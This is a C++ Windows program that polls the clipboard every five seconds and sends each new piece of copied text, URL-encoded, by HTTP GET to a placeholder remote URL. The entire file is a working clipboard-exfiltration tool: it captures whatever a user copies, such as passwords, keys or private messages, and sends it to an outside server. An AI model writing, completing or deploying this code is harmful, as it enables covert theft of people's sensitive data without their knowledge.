#include "main.h"
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <cpr/cpr.h>
#pragma warning(disable : 4996)
using namespace std;

string urlEncode(string str) {
    string new_str = "";
    char c;
    int ic;
    const char* chars = str.c_str();
    char bufHex[10];
    int len = strlen(chars);

    for (int i = 0;i < len;i++) {
        c = chars[i];
        ic = c;

        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') new_str += c;
        else {
            sprintf(bufHex, "%X", c);
            if (ic < 16)
                new_str += "%0";
            else
                new_str += "%";
            new_str += bufHex;
        }
    }
    return new_str;
}

int main()
{


    std::string oldtext = "";
    while (true)
    {

        OpenClipboard(nullptr);
        HANDLE hData = GetClipboardData(CF_TEXT);
        char* pszText = static_cast<char*>(GlobalLock(hData));

        std::string text(pszText);

        GlobalUnlock(hData);
        CloseClipboard();

        if (oldtext != text) {
            cpr::Response r = cpr::Get(cpr::Url{ "your url" + urlEncode(text) });
            r.status_code;                  // 200
            r.header["content-type"];       // application/json; charset=utf-8
            r.text;                         // JSON text string
            oldtext = text;

            std::cout << "sent :" + text << std::endl << r.status_code << std::endl;
        }

        Sleep(5000);
    }

}